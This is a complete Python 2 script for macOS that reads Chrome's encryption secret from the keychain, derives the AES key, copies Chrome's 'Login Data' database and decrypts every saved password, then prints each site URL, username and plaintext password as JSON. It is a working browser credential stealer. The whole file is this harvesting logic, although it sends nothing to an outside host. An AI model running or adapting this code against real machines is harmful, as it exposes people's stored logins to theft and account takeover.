import platform
from getpass import getuser
from shutil import copy
import sqlite3
from os import unlink
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import subprocess
import string
import json


class ChromePasswd(object):
    def __init__(self):
        target_os = platform.system()
        if target_os == 'Darwin':
            self.mac_init()


    def mac_init(self):
        my_pass = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, stderr = my_pass.communicate()
        my_pass = stdout.replace("\n", "")
        
        iterations = 1003
        salt = b'saltysalt'
        length = 16
        
        self.key = PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = ( "/Users/{}/Library/Application Support/Google"
                        "/Chrome/Default/".format(getuser()))


    def mac_decrypt(self, enc_passwd):
        iv = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = AES.new(self.key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


    @property
    def getLoginDB(self):
        return self.dbpath


    def getPass(self, prettyprint=False):
        copy(self.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute('''SELECT action_url, username_value, password_value
                        FROM logins''')
        data = {'data':[]}
        for result in cursor.fetchall():
            if result[1] or result[2]:
                d = {}
                d['url'] = result[0]
                d['username'] = result[1]
                passwd = self.mac_decrypt(result[2])
                d['password'] = ''.join(i for i in passwd if i in string.printable)
                data['data'].append(d)
        conn.close()
        unlink("Login Data.db")
        
        if prettyprint:
            print json.dumps(data, indent=4)
        return data


def main():
    ch = ChromePasswd()
    print ch.getLoginDB
    ch.getPass(prettyprint=True)


if __name__ == '__main__':
    main()
